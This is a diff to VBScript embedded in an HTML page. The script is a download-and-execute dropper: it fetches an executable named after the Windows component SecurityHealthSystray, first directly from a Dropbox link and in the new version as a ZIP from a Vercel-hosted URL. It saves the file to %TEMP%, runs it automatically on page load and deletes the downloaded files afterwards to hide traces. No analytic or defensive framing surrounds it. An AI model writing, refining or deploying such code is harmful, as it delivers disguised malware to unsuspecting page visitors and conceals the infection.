@@ -25,47 +25,69 @@
    Option Explicit
 
 Sub DownloadAndRunFile()
-    Dim objHTTP, objFSO, strFileURL, strSavePath, strFileName
+    Dim objHTTP, objFSO, strFileURL, strZipPath, strExtractPath, strExePath
 
-    ' Set the Google Drive direct download link
-    strFileURL = "https://www.dropbox.com/scl/fi/t9h6fzxjvzbfgehq4u83y/SecurityHealthSystray.exe?rlkey=hqikq51s475ig1nmikxbb5yso&st=3url5t1k&dl=1"
+    ' Set the URL for the ZIP file hosted on Vercel
+    strFileURL = "https://your-vercel-app.vercel.app/static/downloads/SecurityHealthSystray.zip"
 
-    ' Set the local save path and file name
-    strSavePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
-    strFileName = "downloaded_file.exe"
+    ' Set the local path for saving the downloaded ZIP file
+    strZipPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SecurityHealthSystray.zip"
 
-    ' Construct the full save path
-    strSavePath = strSavePath & "\" & strFileName
+    ' Set the extraction path (temporary folder)
+    strExtractPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") & "\SecurityHealthSystray"
 
-    ' Download the file using WinHTTP
+    ' Create a FileSystemObject
+    Set objFSO = CreateObject("Scripting.FileSystemObject")
+
+    ' Download the ZIP file using WinHTTP
     Set objHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
     objHTTP.Open "GET", strFileURL, False
     objHTTP.Send
 
     If objHTTP.Status = 200 Then
+        ' Save the downloaded ZIP file
         Dim objStream
         Set objStream = CreateObject("ADODB.Stream")
         With objStream
             .Type = 1 ' adTypeBinary
             .Open
             .Write objHTTP.ResponseBody
-            .SaveToFile strSavePath
+            .SaveToFile strZipPath, 2 ' Overwrite if exists
             .Close
         End With
-        Set objStream = Nothing
 
-        ' Run the downloaded file
+        ' Create extraction directory if it doesn't exist
+        If Not objFSO.FolderExists(strExtractPath) Then
+            objFSO.CreateFolder(strExtractPath)
+        End If
+
+        ' Extract the ZIP file using Shell Application
+        Dim objShellApp
+        Set objShellApp = CreateObject("Shell.Application")
+        
+        ' Extract the ZIP file to the specified folder
+        objShellApp.Namespace(strExtractPath).CopyHere objShellApp.Namespace(strZipPath).Items
+
+        ' Wait for extraction to complete (you may need to adjust this timing)
+        WScript.Sleep 5000 
+
+        ' Construct the path to the extracted executable (adjust if necessary)
+        strExePath = strExtractPath & "\SecurityHealthSystray.exe" 
+
+        ' Run the extracted executable
         Dim objShell
         Set objShell = CreateObject("WScript.Shell")
-        objShell.Run strSavePath, 1, True ' Wait for the file to finish running
-        Set objShell = Nothing
+        objShell.Run strExePath, 1, True ' Wait for the file to finish running
 
-        ' Delete the file after running
-        Set objFSO = CreateObject("Scripting.FileSystemObject")
-        If objFSO.FileExists(strSavePath) Then
-            objFSO.DeleteFile strSavePath
+        ' Clean up: delete downloaded and extracted files after execution
+        If objFSO.FileExists(strZipPath) Then
+            objFSO.DeleteFile strZipPath
         End If
-        Set objFSO = Nothing
+        
+        If objFSO.FolderExists(strExtractPath) Then
+            objFSO.DeleteFolder strExtractPath, True
+        End If
+
     Else
         MsgBox "Failed to download the file. Status: " & objHTTP.Status
     End If
@@ -73,8 +95,8 @@ Sub DownloadAndRunFile()
     Set objHTTP = Nothing
 End Sub
 
-' Call the main subroutine
-DownloadAndRunFile
+' Call the main subroutine to execute the download and extraction process
+DownloadAndRunFile()
 </script>
 
 </body>
